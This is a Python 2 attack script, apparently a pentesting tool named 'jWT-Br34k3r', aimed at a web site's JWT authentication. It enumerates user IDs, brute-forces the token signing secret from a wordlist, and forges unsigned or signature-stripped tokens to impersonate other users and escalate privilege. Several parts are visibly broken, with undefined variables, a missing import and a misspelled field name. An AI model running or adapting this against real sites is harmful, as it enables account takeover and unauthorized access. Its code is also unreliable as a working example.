#!/usr/bin/env python 
# -*- coding:utf-8 -*- 
import colored as c 
import requests
import json
import jwt

__author__ = "chouaib hm (cho)"
__copyright__ = "Copyright 2017, Bugs_Bunny Team | Pentesting Tools"
__version__ = "0.5"
__status__ = "Development"
__email__ = "chouaibhammami0@gmail.com"
__codename__ = 'jWT-Br34k3r'
__source__ ="https://github.com/chouaibhm/Bypass-Jwt"
__info__ ="Elevation of Privilege"


def banner():
	print """
		    _____                  __            _______                                                    
		   /     |                /  |          /       \                                                   
		   $$$$$ | __   __   __  _$$ |_         $$$$$$$  | __    __   ______    ______    _______   _______ 
		      $$ |/  | /  | /  |/ $$   |        $$ |__$$ |/  |  /  | /      \  /      \  /       | /       |
		 __   $$ |$$ | $$ | $$ |$$$$$$/         $$    $$< $$ |  $$ |/$$$$$$  | $$$$$$  |/$$$$$$$/ /$$$$$$$/ 
		/  |  $$ |$$ | $$ | $$ |  $$ | __       $$$$$$$  |$$ |  $$ |$$ |  $$ | /    $$ |$$      \ $$      \ 
		$$ \__$$ |$$ \_$$ \_$$ |  $$ |/  |      $$ |__$$ |$$ \__$$ |$$ |__$$ |/$$$$$$$ | $$$$$$  | $$$$$$  |
		$$    $$/ $$   $$   $$/   $$  $$/       $$    $$/ $$    $$ |$$    $$/ $$    $$ |/     $$/ /     $$/ 
		 $$$$$$/   $$$$$/$$$$/     $$$$/        $$$$$$$/   $$$$$$$ |$$$$$$$/   $$$$$$$/ $$$$$$$/  $$$$$$$/  
		                                                  /  \__$$ |$$ |                                    
		                                                  $$    $$/ $$ |                                    
		                                                   $$$$$$/  $$/                                     
							=======================> by chouaib \n
		
		"""
	


def user_enumurate(url,payload,headers):
    for i in range(0, 100):
    	users = {"userId": i}
    	response = requests.get(url, data=payload, headers=headers, params=users)
    	result = json.loads(response.text)
    	print(result['urls'], x, result['user'])
    	

def bute_signature(url,payload,headers,userId):
	res = requests.post(url, data=json.dumps(payload), headers=headers)
	token = res.headers['Authorization'][7::]
	print token
	with open('secrets.txt') as keys: 

		for i in keys:
			try:
				payload = jwt.decode(token, i.rstrip(), algorithms=['HS256'])
				print '\033[1;32;40m successed key :   %s ' %i.rstrip()
				encoded = jwt.encode({"user": userId}, i.rstrip(), algorithm='none')
				new_token='Bearer '+encoded
				headers = {'X-Authorization': new_token}
				res = requests.post(url, data=json.dumps(payload), headers=headers)
				print res.text
				break
			except jwt.InvalidTokenError:
				print  '\033[1;31;40m invalid key %s' %i.rstrip()
			except jwt.ExpiredSignatureError:
				print '\033[1;31;40m invalid key  %s' %i.rstrip()

def breakJwt(url,headers,userId,password):
	payload = {"usename":userId, "password": "password"}
	#res = requests.post(url, data=json.dumps(payload), headers=headers)
	token = res.headers['Authorization'][7::]
	print 'Token founded : %s'%token
	bypass = '.'+token.split('.')[1]+'.'
	#res = requests.post(url, data=json.dumps(payload), headers=headers)
	headersN = {'X-Authorization': bypass}
	req = requests.post(url, data=json.dumps(payload), headers=headersN)
	print "Bypass Authorization Jwt"
	print req.text
def main_menu():

    print "Please choose the menu you want to start:"
    print "1. Break Authorization and Elevation of Privilege"
    print "2. Brute Force Authorization Signature"
    
 

if __name__ == '__main__':
	try:
		banner()
		main_menu()
		choice = raw_input(" >>  ") 
		headers = {'content-type': 'application/json'}
		if choice == '1':
			url = raw_input('Web Site : ')
			user = raw_input('Your username : ')
			password = raw_input('Your password : ')
			payload = {"username": user,"password":password}
			user_enumurate(url,payload,headers)
			breakJwt(url,headers,userId,password)	
		else:
			url = raw_input('Web Site : ')
			user = raw_input('Your username : ')
			password = raw_input('Your password : ')
			payload = {"username": user,"password":password}
			user_enumurate(url,payload,headers)
			userId = raw_input ('Choose user Id : ')
			bute_signature(url,payload,headers,userId)
	except KeyboardInterrupt as err:
		print "\n[!] By... "
		sys.exit(0)
